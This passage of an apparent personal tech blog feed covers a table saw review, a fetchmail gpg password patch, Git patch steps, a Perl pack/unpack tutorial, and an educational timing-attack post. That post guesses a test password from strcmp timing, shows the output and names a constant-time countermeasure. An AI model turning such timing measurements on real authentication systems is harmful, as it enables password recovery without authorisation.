&lt;h1&gt;AEG support&lt;/h1&gt;
&lt;p&gt;Since I planned to modify my riving knife I wanted to ask AEG if and where I
could buy another riving knife, so that I could have one modified riving knife
and one that is as when I bought the saw. I think I've tried to contact them 2
or 3 times using the "Contact US" link on table saw page. However without
success, I haven't seen any response at all. This is bad AEG!&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;h2&gt;Pros&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Rather cheap table saw, I bought it when they had some kind of campaign and
  without shipping it costed, I think 3995:- SEK which is roughly USD $460 with
  todays exchange rate. Normally it's a little bit more expensive.&lt;/li&gt;
&lt;li&gt;Well built. It feels sturdy.&lt;/li&gt;
&lt;li&gt;Quite good cutting depth, 90mm for straight cuts and 62mm for 45 degree cuts
  is quite good.&lt;/li&gt;
&lt;li&gt;Integrated table side extension up to 645 mm.&lt;/li&gt;
&lt;li&gt;Makes quite clean cuts.&lt;/li&gt;
&lt;li&gt;Soft start: Nice to have even though not necessary.&lt;/li&gt;
&lt;li&gt;Foldable stand which is very easy to use.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2&gt;Cons&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Hard to make perfect straight cuts using the fence.&lt;/li&gt;
&lt;li&gt;The miter gauge slots in the table is a joke. Why the heck didn't they go for
  standard 3/4" (wide) x 3/8" (deep) miter gauge slots?&lt;/li&gt;
&lt;li&gt;The included miter gauge is just crap.&lt;/li&gt;
&lt;li&gt;Riving knife is too high.&lt;/li&gt;
&lt;li&gt;No quick mount/release of the riving knife. It's mounted using normal
  hex-bolts.&lt;/li&gt;
&lt;li&gt;The insert is not so well made and this is also a non-standard format, which
  means that you cannot buy standards inserts, which you otherwise easily can
  buy from eBay or woodworking shops.&lt;/li&gt;
&lt;li&gt;AEG support doesn't answer when using the "&lt;a href="http://www.aeg-powertools.eu/header/contact-us/"&gt;Contact US&lt;/a&gt;" page on their site.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2&gt;Is it worth buying?&lt;/h2&gt;
&lt;p&gt;If you're a beginner and plan to mainly use it to rip wood and doesn't care too
much about accuracy, then I think this is a good table saw. However, if you are
more into accuracy and care about micrometer instead of millimeter and if you
plan to use various tools attached to the slots, then I'd not recommend you to
buy this table saw. It's simply too much hassle to create and or modify existing
runners to make them usable. For me it is working now after the tweaks I've
done. But if I would have known what I know now I would have looked for another
table saw instead, like &lt;a href="http://www.bosch-professional.com/gb/en/gts-10-xc-26179-ocs-p/"&gt;GTS 10 XC Professional&lt;/a&gt;, 
&lt;a href="http://www.amazon.com/DEWALT-DW744XRS-10-inch-Table-Rolling/dp/B0014GD3HQ"&gt;Dewalt DW744XRS&lt;/a&gt; or &lt;a href="http://www.amazon.com/DEWALT-DW745-10-Inch-Job-Site-Capacity/dp/B000HXT2N6"&gt;DEWALT DW745&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I hope this review was useful, in case you have questions, please use the
comment field below and I'll try to answer your questions.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; 2016: I've sold this table saw and I did end up buying a Dewalt DW745 instead.&lt;/p&gt;
&lt;p&gt;// Joakim&lt;/p&gt;</content><category term="Woodworking"></category></entry><entry><title>Fetchmail and GnuPG</title><link href="https://jyx.github.io/fetchmail-and-gnupg.html" rel="alternate"></link><published>2014-11-01T23:02:03+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2014-11-01:/fetchmail-and-gnupg.html</id><summary type="html">&lt;p&gt;When using &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;imap&lt;/a&gt;
in &lt;a href="http://en.wikipedia.org/wiki/Mutt_(email_client)"&gt;mutt&lt;/a&gt; you have the
possibility to use &lt;code&gt;gpg&lt;/code&gt; to decrypt your password instead of having it as
plaintext in your configuration file (&lt;code&gt;.muttrc&lt;/code&gt;), see
&lt;a href="https://wiki.archlinux.org/index.php/Mutt#Passwords_management"&gt;ArchWiki&lt;/a&gt; how
to do that.&lt;/p&gt;
&lt;p&gt;However, if you consider using &lt;code&gt;POP3&lt;/code&gt;, then you will also need to install and
enable &lt;a href="http://msmtp.sourceforge.net"&gt;msmtp&lt;/a&gt; (not strictly needed),
&lt;a href="http://www.fetchmail.info"&gt;fetchmail&lt;/a&gt; and
&lt;a href="http://www.procmail.org"&gt;procmail&lt;/a&gt;. Ubuntu have created a quite nice
&lt;a href="https://help.ubuntu.com/community/MuttAndGmail"&gt;guide&lt;/a&gt; of
the steps involved.&lt;/p&gt;
&lt;p&gt;Just as &lt;code&gt;mutt&lt;/code&gt; also &lt;code&gt;msmtp&lt;/code&gt; have the possibility to use &lt;code&gt;gpg&lt;/code&gt; in runtime instead â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;When using &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;imap&lt;/a&gt;
in &lt;a href="http://en.wikipedia.org/wiki/Mutt_(email_client)"&gt;mutt&lt;/a&gt; you have the
possibility to use &lt;code&gt;gpg&lt;/code&gt; to decrypt your password instead of having it as
plaintext in your configuration file (&lt;code&gt;.muttrc&lt;/code&gt;), see
&lt;a href="https://wiki.archlinux.org/index.php/Mutt#Passwords_management"&gt;ArchWiki&lt;/a&gt; how
to do that.&lt;/p&gt;
&lt;p&gt;However, if you consider using &lt;code&gt;POP3&lt;/code&gt;, then you will also need to install and
enable &lt;a href="http://msmtp.sourceforge.net"&gt;msmtp&lt;/a&gt; (not strictly needed),
&lt;a href="http://www.fetchmail.info"&gt;fetchmail&lt;/a&gt; and
&lt;a href="http://www.procmail.org"&gt;procmail&lt;/a&gt;. Ubuntu have created a quite nice
&lt;a href="https://help.ubuntu.com/community/MuttAndGmail"&gt;guide&lt;/a&gt; of
the steps involved.&lt;/p&gt;
&lt;p&gt;Just as &lt;code&gt;mutt&lt;/code&gt; also &lt;code&gt;msmtp&lt;/code&gt; have the possibility to use &lt;code&gt;gpg&lt;/code&gt; in runtime instead
of having the password stored in plaintext. The way to do that in &lt;code&gt;msmtp&lt;/code&gt; is to
put a line mention &lt;code&gt;gpg&lt;/code&gt; in your &lt;code&gt;$HOME/.msmtprc file&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;passwordeval    &lt;span class="s2"&gt;&amp;quot;gpg --quiet --for-your-eyes-only --no-tty --decrypt ~/.msmtp-gmail.gpg&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, &lt;code&gt;fetchmail&lt;/code&gt; doesn't have the same option. So, &lt;code&gt;mutt&lt;/code&gt; and &lt;code&gt;msmtp&lt;/code&gt; is
fine, but you still have to put your password in a cleartext file when
configuring &lt;code&gt;fetchmail&lt;/code&gt;. Clearly there must be a better way to handle this? I
downloaded the source code
(&lt;a href="http://sourceforge.net/projects/fetchmail/files/branch_6.3/fetchmail-6.3.26.tar.xz/download"&gt;fetchmail-6.3.26&lt;/a&gt;)
and did a quick and dirty hack. I just modified the main function in the file
&lt;code&gt;fetchmail.c&lt;/code&gt;, so that instead of having to provide the password on command line
(when password is not set in &lt;code&gt;$HOME/.fetchmailrc&lt;/code&gt;) it makes use of &lt;code&gt;gpg&lt;/code&gt; similar to how
both mutt and &lt;code&gt;msmtp&lt;/code&gt; does. It isn't pretty ... but it works (tested on Arch Linux
on a Raspberry PI). To try it out, use the same &lt;code&gt;gpg&lt;/code&gt; encrypted file as you use
for &lt;code&gt;msmtp&lt;/code&gt;, i.e, &lt;code&gt;$HOME/msmtp-gmail.gpg&lt;/code&gt; and patch &lt;code&gt;fetchmail&lt;/code&gt; using this patch and
rebuild.&lt;/p&gt;
&lt;h1&gt;Source&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/downloads/patch/fetchmail_gpg.patch"&gt;fetchmail_gpg.patch&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="Coding"></category></entry><entry><title>Timing Attack - Proof of Concept</title><link href="https://jyx.github.io/timing-attack-proof-of-concept.html" rel="alternate"></link><published>2014-02-02T10:38:37+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2014-02-02:/timing-attack-proof-of-concept.html</id><summary type="html">&lt;p&gt;You might have heard about timing attacks, but either thought it sounded
too complicated to understand or that it is too complicated to actually do such
an attack. In this post I'm going to give a brief overview of a timing attack
and also provide some example code that you can play with on your own. Hopefully
after reading this post you will understand that you cannot neglect this if you
are creating a system where security is needed.&lt;/p&gt;
&lt;h1&gt;What â€¦&lt;/h1&gt;</summary><content type="html">&lt;p&gt;You might have heard about timing attacks, but either thought it sounded
too complicated to understand or that it is too complicated to actually do such
an attack. In this post I'm going to give a brief overview of a timing attack
and also provide some example code that you can play with on your own. Hopefully
after reading this post you will understand that you cannot neglect this if you
are creating a system where security is needed.&lt;/p&gt;
&lt;h1&gt;What is a timing attack&lt;/h1&gt;
&lt;p&gt;A &lt;a href="http://en.wikipedia.org/wiki/Timing_attack"&gt;timing attack&lt;/a&gt; is a so called
&lt;a href="http://en.wikipedia.org/wiki/Side_channel_attack"&gt;side channel attack&lt;/a&gt;
where you analyze the timing information on a system is such a way that it
allows to break the protection of the system or a program running on it.&lt;/p&gt;
&lt;h1&gt;How is a timing attack performed?&lt;/h1&gt;
&lt;p&gt;Typically you need to measure the amount of time needed to do operations of some
kind. You can do this in several ways, for example you could hook up a set of
probes on a chip or a PCB and watch the result on an oscilloscope or a logical
analyzer. Another option is to simply leverage features from the
CPU/architecture itself. On a normal PC running Intel (or AMD) you can use the
time stamp counter &lt;a href="http://en.wikipedia.org/wiki/Time_Stamp_Counter"&gt;rdtsc&lt;/a&gt;
or a High Precision Event Timer
&lt;a href="http://en.wikipedia.org/wiki/High_Precision_Event_Timer"&gt;hpet&lt;/a&gt;. Be aware that
the time stamp counter isn't reliable any longer, since process speeds can
change (due to power management), you have context switches etc. But just for
testing it can be good enough.&lt;/p&gt;
&lt;p&gt;So you have found a way of taking time measures, what next? The easy answer is,
start measure the execution time of sensitive functions. For example when
calling functions that verifies password, functions that does encryption and
such. Measuring the time needed for &lt;code&gt;strcmp&lt;/code&gt; as exemplified in the proof of
concept code below is easy. It becomes more complicated if you want to do the
same when doing
&lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard#Side-channel_attacks"&gt;AES&lt;/a&gt;
encryption for example. It is still doable, but you also need to know the
algorithm to know where to look and how to interpret the leaked information.&lt;/p&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;p&gt;Main idea is that you need balance the string compare functions so that it
always takes the same amount of time to perform.&lt;/p&gt;
&lt;h1&gt;Proof of concept&lt;/h1&gt;
&lt;p&gt;I have put together a small proof of concept / testing program to show that it
is actually not that complicated to do a timing attack. It is unlikely that it
is as easy as this, but still, it gives the idea and shows that you can
actually use timing to guess password, guesses that are fairly good. The main
idea is to show how execution time actually varies when doing string
comparison. The by using this information leakage we show that we can guess
pretty good what we believe the correct character is in the correct
password/string.&lt;/p&gt;
&lt;h1&gt;The algorithm&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Loop over all characters, one by one in the string that we want to check
   (&lt;code&gt;thisisalongstring&lt;/code&gt; in this case).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For every character in the string, do an inner loop, where you are looping
   from &lt;code&gt;'a'&lt;/code&gt; to &lt;code&gt;'z'&lt;/code&gt;. For every call to the string comparison function record
   the amount of time it took. The letter that had longest execution time is
   most likely the correct character. Hence save that character in the in the
   array that contains guessed character.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Lastly compare the correct string with guessed string to see if we got all
   timing based guesses correct or not.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Results&lt;/h2&gt;
&lt;p&gt;Here are the test result of a test run with debug information enabled&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ make &lt;span class="nv"&gt;DEBUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
$ ./main &lt;span class="m"&gt;10&lt;/span&gt;
Shows a couple of examples of the &lt;span class="nb"&gt;time&lt;/span&gt; it takes to make string comparison
avg &lt;span class="nb"&gt;time&lt;/span&gt; long string &lt;span class="o"&gt;(&lt;/span&gt;thisisalongstring&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;821&lt;/span&gt;
avg &lt;span class="nb"&gt;time&lt;/span&gt; short string &lt;span class="o"&gt;(&lt;/span&gt;foo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;532&lt;/span&gt;
avg &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; char correct &lt;span class="o"&gt;(&lt;/span&gt;XXX/foo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;486&lt;/span&gt;
avg &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; char correct &lt;span class="o"&gt;(&lt;/span&gt;fXX/foo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;495&lt;/span&gt;
avg &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; char correct &lt;span class="o"&gt;(&lt;/span&gt;foX/foo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;540&lt;/span&gt;
avg &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; char correct &lt;span class="o"&gt;(&lt;/span&gt;foo/foo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;561&lt;/span&gt;
Guessed that pw should be: thisisalongshring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thhbisalongstring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thisisalongstring
Guessed that pw should be: thisimalongstrimf
Guessed that pw should be: thisisalongstrhng
&lt;span class="m"&gt;6&lt;/span&gt; successful timing attacks
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The figures will vary, but they are almost always in the same region. Looking
at:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Line 3&lt;/strong&gt;: we can see that it takes &lt;code&gt;821&lt;/code&gt; time units for a full and correct string
compare of the string &lt;code&gt;thisisalongstring&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Line 4&lt;/strong&gt;: we can see that it takes &lt;code&gt;532&lt;/code&gt; time units to correctly match the
string &lt;code&gt;foo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Line 5-8&lt;/strong&gt;: for every test run, we add a correct matching character and as
expected we can see that the time increases for every correct character. This
is because the string compare function as said before has a timing linear to
the correct number of characters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Line 9-19&lt;/strong&gt;: shows the result when trying to guess the string
&lt;code&gt;thisisalongstring&lt;/code&gt; based on the time it takes to guess &lt;code&gt;'a'&lt;/code&gt;, &lt;code&gt;'b'&lt;/code&gt;, &lt;code&gt;'c'&lt;/code&gt;,
... &lt;code&gt;'z'&lt;/code&gt;, for every character. This particular run we guessed correct 6 out or
10 times. Not that bad, it takes roughly 0.002 seconds to run everything above.
According to Steve Gibson's &lt;a href="https://www.grc.com/haystack.htm"&gt;Password Haystack&lt;/a&gt;
page, it takes approximately 3.75 centuries to brute force that password
&lt;strong&gt;once&lt;/strong&gt; using a what he calls a "massive cracking array scenario (assuming one
hundred trillion guesses per second)".&lt;/p&gt;
&lt;h1&gt;A couple of interesting things I've noticed&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;If I increase the &lt;code&gt;TEST_LOOPS&lt;/code&gt; define I actually get much worse result?&lt;/li&gt;
&lt;li&gt;If I turn on all optimizations, i.e. &lt;code&gt;-O3&lt;/code&gt;, it doesn't work at all.&lt;/li&gt;
&lt;li&gt;The last character was always incorrectly guessed and that is the reason why
  I've added a space at the end of the string '&lt;code&gt;thisisalongstring&lt;/code&gt;', which I
  later on strip away. I believe the reason for this problem is inaccuracy
  using &lt;code&gt;rdtsc&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If any reader of this post knows the answer to my reflections above, please
leave a comment.&lt;/p&gt;
&lt;h1&gt;Source code&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/downloads/timing/time_attack_strcmp.c"&gt;time_attack_strcmp.c&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="/downloads/timing/Makefile"&gt;Makefile&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="Hacking"></category></entry><entry><title>Apply patches in Git</title><link href="https://jyx.github.io/apply-patches-in-git.html" rel="alternate"></link><published>2012-03-09T00:16:48+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2012-03-09:/apply-patches-in-git.html</id><summary type="html">&lt;p&gt;&lt;img alt="git logo" src="https://jyx.github.io/images/git/logo_git.gif" align="right"&gt;
A common task for a developer has is to apply a patch in Git. I have a simple
scheme that I've been using for a long time and it is very seldom that I get
into problem nowadays when I'm doing patch work.&lt;/p&gt;
&lt;h1&gt;The short version for the impatient&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git am &amp;lt; my_new_feature.patch
$ git apply --reject --whitespace&lt;span class="o"&gt;=&lt;/span&gt;fix my_new_feature.patch
$ git status
$ vim my_conflicting_file.c*
$ find . -name &lt;span class="s2"&gt;&amp;quot;*.rej&amp;quot;&lt;/span&gt; -exec rm -f &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
$ git add .
$ git am --resolved
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Long version for the â€¦&lt;/h1&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="git logo" src="https://jyx.github.io/images/git/logo_git.gif" align="right"&gt;
A common task for a developer has is to apply a patch in Git. I have a simple
scheme that I've been using for a long time and it is very seldom that I get
into problem nowadays when I'm doing patch work.&lt;/p&gt;
&lt;h1&gt;The short version for the impatient&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git am &amp;lt; my_new_feature.patch
$ git apply --reject --whitespace&lt;span class="o"&gt;=&lt;/span&gt;fix my_new_feature.patch
$ git status
$ vim my_conflicting_file.c*
$ find . -name &lt;span class="s2"&gt;&amp;quot;*.rej&amp;quot;&lt;/span&gt; -exec rm -f &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
$ git add .
$ git am --resolved
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Long version for the one needing explanations to the steps&lt;/h1&gt;
&lt;p&gt;To start with I always first try applying the patch with git am, i.e.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git am &amp;lt; my_new_feature.patch
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sometimes this is enough and the patch simply applies, however when it fails to
apply I just continue writing.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git apply --reject --whitespace&lt;span class="o"&gt;=&lt;/span&gt;fix my_new_feature.patch
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This will force Git to apply as much as it can and for the rest of the hunks
that it cannot merge it will produce files ending with .rej. So the next step I
do after git apply is just to run&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git status
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And notice the untracked files ending in .rej. Now I know what files Git
couldn't merge when applying the patch, so let's say that I have a file called
my_conflicting_file.c which Git couldn't merge. To solve this I open it in my
favorite editor by doing like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ vim my_conflicting_file.c*
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This will open both my_conflicting_file.c and my_conflicting_file.c.rej. I will
split the window in vim (CTRL+W V), and then open the other file by typing :bp
in vim. Now it is up to you as a developer to decicde what changes in the &lt;em&gt;.rej
file should go into the conflicting file. I.e, what changes in
my_conflicting_file.c.rej, should be in my_conflicting_file.c. Sometimes you
will notice that you don't have to change anything at all and sometimes you will
notice that you have to add or remove lines in the conflicting file. Don't
forget to remove the + and/or - at the start of the lines in the &lt;/em&gt;.rej file!
When this step is done I delete all the *.rej files and then add the changes
files to the index in Git. I.e:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find . -name &lt;span class="s2"&gt;&amp;quot;*.rej&amp;quot;&lt;/span&gt; -exec rm -f &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
$ git add .
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The last step you have to do before the patch have been merged is to tell git
that the "am" that you started have been resolved.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git am --resolved
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Patch work done! If you follow this scheme I'm pretty sure that you will do fine
in the future when applying patches.&lt;/p&gt;</content><category term="Git"></category></entry><entry><title>Perl pack and unpack</title><link href="https://jyx.github.io/perl-pack-and-unpack.html" rel="alternate"></link><published>2012-03-04T00:15:48+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2012-03-04:/perl-pack-and-unpack.html</id><summary type="html">&lt;p&gt;&lt;img alt="Perl logo" src="https://jyx.github.io/images/perlpap/logo_perl.jpg" align="right"&gt;
When you have to read and write binary data using Perl, then you preferably use
the built in functions pack and unpack. With the pack function you will create
a string which will be different depending on what kind of template you provide
to the pack function (the unpack does the same, but in the opposite direction).&lt;/p&gt;
&lt;p&gt;I was writing a simple Perl script that was reading a binary file which
contained data that originated from a c &lt;code&gt;struct&lt;/code&gt;. I â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Perl logo" src="https://jyx.github.io/images/perlpap/logo_perl.jpg" align="right"&gt;
When you have to read and write binary data using Perl, then you preferably use
the built in functions pack and unpack. With the pack function you will create
a string which will be different depending on what kind of template you provide
to the pack function (the unpack does the same, but in the opposite direction).&lt;/p&gt;
&lt;p&gt;I was writing a simple Perl script that was reading a binary file which
contained data that originated from a c &lt;code&gt;struct&lt;/code&gt;. I.e., I wanted to parse the
binary file and print what the values would be if the binary file was read into
the c struct.&lt;/p&gt;
&lt;p&gt;Let's say that the struct is on the format:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;binary_data&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I.e, we have data consisting of 4 bytes of &lt;code&gt;a&lt;/code&gt;, 4 bytes of &lt;code&gt;b&lt;/code&gt; and 1 byte of
&lt;code&gt;c&lt;/code&gt;. Let us say that the binary files consist of the following values&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;a = 196 dec (0xC4 hex)&lt;/span&gt;
&lt;span class="err"&gt;b = 4293844428 dec (0xFFEEDDCC hex)&lt;/span&gt;
&lt;span class="err"&gt;c = 75 dec (0x4B hex)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then our binary file, &lt;code&gt;binary_data.bin&lt;/code&gt; would contain this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;c4 00 00 00 cc dd ee ff 4b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To be able to read this back and print the values in decimal or hex, you simply
start by reading the size of each element in the struct one by one and for each
item you unpack the data according to the size of the element in the struct.
For &lt;code&gt;uint32_t&lt;/code&gt; you use &lt;code&gt;L&lt;/code&gt; and for &lt;code&gt;uint8_t&lt;/code&gt; &lt;code&gt;C&lt;/code&gt;. A complete listing of the
different templates (as they are called in Perl) could be found in the Perl
documentation. Be careful about little- vs big-endian when you select template.&lt;/p&gt;
&lt;p&gt;Below is a Perl script that creates the binary file, then read the data back
from the file and print the values both in decimal and hex.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/perl&lt;/span&gt;
&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nn"&gt;strict&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nn"&gt;warnings&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;binmode&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;my&lt;/span&gt; &lt;span class="nv"&gt;$buf&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;# Write decimal values as binary data.&lt;/span&gt;
&lt;span class="nb"&gt;open&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;gt;binary_data.bin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;die&lt;/span&gt; &lt;span class="vg"&gt;$!&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;my&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;196&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4293844428&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;pack&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;close&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;# Read back binary data to decimal value.&lt;/span&gt;
&lt;span class="nb"&gt;open&lt;/span&gt; &lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;binary_data.bin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;die&lt;/span&gt; &lt;span class="vg"&gt;$!&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

